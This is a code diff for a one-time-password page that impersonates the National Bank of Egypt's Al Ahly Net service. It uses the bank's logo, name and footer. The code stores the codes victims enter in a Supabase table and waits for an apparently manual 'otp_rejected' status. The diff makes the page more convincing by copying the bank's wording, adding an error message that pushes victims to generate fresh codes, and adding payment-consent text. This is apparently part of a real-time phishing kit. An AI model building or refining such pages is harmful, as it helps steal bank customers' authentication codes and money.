@@ -1,13 +1,13 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useEffect, useRef, useState } from "react";
-import { ShieldCheck, ArrowRight, Loader2, CheckCircle2 } from "lucide-react";
+import { CheckCircle2 } from "lucide-react";
 import nbeLogo from "@/assets/nbe-logo-full.png.asset.json";
 import { supabase } from "@/integrations/supabase/client";
 import { useSessionRedirect } from "@/hooks/use-session-redirect";
 
 export const Route = createFileRoute("/otp")({
   head: () => ({
-    meta: [{ title: "إدخال رمز التحقق | الأهلي نت" }],
+    meta: [{ title: "ادخل الرقم السري المتغير OTP | الأهلي نت" }],
   }),
   component: OtpPage,
 });
@@ -47,7 +47,7 @@ function OtpPage() {
 
     if (updateError) {
       setSubmitting(false);
-      setError("حدث خطأ، حاول مرة أخرى");
+      setError("خطأ يرجى إصدار كود جديد من خلال تطبيق OTP TOKEN");
       return;
     }
 
@@ -66,7 +66,7 @@ function OtpPage() {
           } else if (row.status === "otp_rejected") {
             setSubmitting(false);
             setOtp("");
-            setError("الرمز غير صحيح، من فضلك حاول مرة أخرى");
+            setError("خطأ يرجى إصدار كود جديد من خلال تطبيق OTP TOKEN");
           }
         },
       )
@@ -92,8 +92,8 @@ function OtpPage() {
   }
 
   return (
-    <div dir="rtl" className="flex min-h-screen flex-col bg-background text-foreground">
-      <header className="flex items-center justify-end border-b border-border px-6 py-4">
+    <div dir="rtl" className="flex min-h-screen flex-col bg-muted/40 text-foreground">
+      <header className="flex items-center justify-end border-b border-border bg-background px-6 py-4">
         <img
           src={nbeLogo.url}
           alt="البنك الأهلي المصري"
@@ -103,32 +103,37 @@ function OtpPage() {
         />
       </header>
 
-      <main className="flex flex-1 flex-col items-center px-4 pt-16">
-        <form onSubmit={handleSubmit} className="w-full max-w-md text-center">
-          <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary">
-            <ShieldCheck className="h-8 w-8" />
-          </div>
-          <h1 className="mt-6 text-2xl font-bold text-foreground">إدخال رمز التحقق</h1>
-          <p className="mt-2 text-sm text-muted-foreground">
-            من فضلك أدخل رمز OTP Token المرسل إليك لإتمام تسجيل الدخول.
+      <main className="flex flex-1 flex-col items-center px-4 py-10">
+        <form
+          onSubmit={handleSubmit}
+          className="w-full max-w-md rounded-2xl bg-background p-6 text-right shadow-sm ring-1 ring-border/60"
+        >
+          <h1 className="text-xl font-bold text-foreground">ادخل الرقم السري المتغير OTP</h1>
+          <p className="mt-4 text-sm leading-relaxed text-muted-foreground">
+            برجاء ادخال الرقم السري المتغير OTP الذي تم انشائه من خلال تطبيق الرقم السري المتغير من تطبيق OTP TOKEN
           </p>
 
-          <div className="mt-10">
+          <div className="mt-8 flex flex-col items-center">
+            <span className="text-base font-medium text-muted-foreground">Verification Code</span>
+            {submitting && (
+              <div className="mt-4 h-10 w-10 rounded-full border-[3px] border-muted border-t-muted-foreground/60 animate-spin" />
+            )}
+          </div>
+
+          <div className="mt-6">
             <input
               type="password"
               inputMode="numeric"
               value={otp}
               onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
-              placeholder="••••••"
+              placeholder="* * * * * *"
               autoFocus
               disabled={submitting}
-              className="w-full rounded-xl border-2 border-input bg-background px-6 py-5 text-center text-3xl font-bold tracking-[0.5em] outline-none transition-colors placeholder:text-muted-foreground/40 focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
+              dir="ltr"
+              className="w-full rounded-xl border border-input bg-background px-6 py-4 text-center text-2xl font-bold tracking-[0.4em] outline-none transition-colors placeholder:text-muted-foreground/50 placeholder:font-normal focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
             />
-            <p className="mt-3 text-xs text-muted-foreground">
-              يمكنك إدخال أي عدد من الأرقام
-            </p>
             {error && (
-              <p className="mt-3 rounded-lg bg-destructive/10 px-3 py-2 text-xs font-semibold text-destructive">
+              <p className="mt-4 text-sm font-semibold text-destructive">
                 {error}
               </p>
             )}
@@ -137,24 +142,20 @@ function OtpPage() {
           <button
             type="submit"
             disabled={submitting || !otp.trim()}
-            className="mt-10 flex w-full items-center justify-center gap-2 rounded-lg bg-primary py-4 text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
+            className="mt-6 w-full rounded-xl bg-primary py-4 text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
           >
             تأكيد
-            <ArrowRight className="h-4 w-4" />
           </button>
 
-          {submitting && (
-            <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/40">
-              <div className="flex flex-col items-center gap-4">
-                <div className="h-16 w-16 rounded-full border-4 border-white/30 border-t-white animate-spin" />
-                <span className="text-base font-bold text-white drop-shadow">يرجى الانتظار</span>
-              </div>
-            </div>
-          )}
+          <p className="mt-6 text-xs leading-relaxed text-muted-foreground">
+            تفاصيل الدفع الخاصة بك مشفرة ومحمية بشكل آمن بالنقر فوق "ادفع الان" فإنك تؤكد أنك أكبر من 20 عاما وأنك توافق على{" "}
+            <a className="underline" href="#">شروط الاستخدام</a> و{" "}
+            <a className="underline" href="#">سياسة الخصوصية الخاصة بنا</a>
+          </p>
         </form>
       </main>
 
-      <footer className="mt-10 bg-primary py-4 text-center text-xs font-semibold text-primary-foreground">
+      <footer className="bg-primary py-4 text-center text-xs font-semibold text-primary-foreground">
         جميع الحقوق محفوظة - البنك الأهلي المصري ©
       </footer>
     </div>
